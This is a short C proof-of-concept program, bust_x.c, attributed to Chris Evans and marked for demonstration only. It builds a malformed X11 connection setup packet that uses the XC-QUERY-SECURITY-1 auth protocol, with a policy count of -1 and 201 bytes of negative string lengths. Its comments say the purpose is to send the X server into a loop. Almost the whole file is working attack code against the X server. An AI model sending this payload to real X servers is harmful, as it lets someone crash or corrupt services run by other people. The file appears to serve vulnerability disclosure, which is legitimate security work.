/* bust_x.c
 * Demonstration purposes only!
 * Chris Evans <chris@scary.beasts.org>
 */
int
main(int argc, const char* argv[])
{
  char bigbuf[201];
  short s;
  char c;

  c = -120;

  memset(bigbuf, c, sizeof(bigbuf));

  /* Little endian */
  c = 'l';
  write(1, &c, 1);
  /* PAD */
  c = 0;
  write(1, &c, 1);
  /* Major */
  s = 11;
  write(1, &s, 2);
  /* Minor */
  s = 0;
  write(1, &s, 2);
  /* Auth proto len */
  s = 19;
  write(1, &s, 2);
  /* Auth string len */
  s = 200;
  write(1, &s, 2);

  /* PAD */
  s = 0;
  write(1, &s, 2);

  /* Auth name */
  write(1, "XC-QUERY-SECURITY-1", 19);

  /* byte to round to multiple of 4 */
  c = 0;
  write(1, &c, 1);

  /* Auth data */
  /* Site policy please */
  c = 2;
  write(1, &c, 1);
  /* "permit" - doesn't really matter */
  c = 0;
  write(1, &c, 1);
  /* number of policies: -1, loop you sucker:) */
  c = -1;
  write(1, &c, 1);
  /* Negative stringlen.. 201 of them just in case, chortle... */

  write(1, bigbuf, sizeof(bigbuf));
}
